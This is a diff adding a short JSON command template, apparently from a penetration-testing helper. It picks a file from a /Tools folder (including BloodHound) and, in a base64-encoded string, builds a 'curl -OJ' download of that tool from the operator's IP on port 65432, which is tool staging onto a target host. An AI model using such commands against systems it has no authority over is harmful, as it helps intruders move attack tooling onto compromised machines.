@@ -1,0 +1,6 @@
+[
+    {"require":"IP"},
+    {"require-from-cmd":"cd /Tools; export MANE=$(find . -type f  -not -path '*/.*' -not -path './Wordlists/*' -not -path './Binary/*' -not -iname '*.mkt' -not -iname '*.js.map' -not -iname '*.css' -not -iname '*.js' -not -iname '*.gif' -not -iname '*.svg' -not -iname '*.ts' -not -iname '*.jpg'  -not -iname '*.png' -not -iname '*.pak' -not -iname '*.jsx' -not -iname '*.json' -not -iname '*.md' -not -iname 'LICENSE'  -not -iname '*.yml' -not -iname '*.scss' -not -iname '*.ttf' -not -iname '*.woff2'  -not -iname '*.flow'  -not -iname '*.map' -not -iname '*.less' -not -iname '*.njs' -not -iname '*.html' -not -iname '*.post' -not -iname '*.pre' -not -iname '*.txt' -not -iname '*.coffee' -not -iname '*.ico' -not -iname '*.ls' -not -iname '*.pdb' -not -iname '*.log' -not -iname '*.woff' -not -iname '*.eot' -not -iname '*.snap'  -not -path './Windows/Bloodhound/resources/app/node_modules/*' | fzf)"},
+    {"require-from-cmd-b64":"ZXhwb3J0IE1BTkU9JChlY2hvICRNQU5FIHwgc2VkICdzL15cLi8vZycp"},
+    {"send-from-cmd-b64":"SVA9JChpZiBpcCAtanNvbiBhZGRyIHNob3cgJElQICY+IC9kZXYvbnVsbCA7IHRoZW4gZWNobyAkKGlwIC1qc29uIGFkZHIgc2hvdyAkSVAgfCYganEgLXIgJy5bXS5hZGRyX2luZm9bXSB8IHNlbGVjdCguZmFtaWx5ID09ICJpbmV0IikubG9jYWwnICkgOyBlbHNlIGVjaG8gIiRJUCI7IGZpKTsgZWNobyAiY3VybCAtT0ogaHR0cDovLyRJUDo2NTQzMiRNQU5FIg=="}
+]
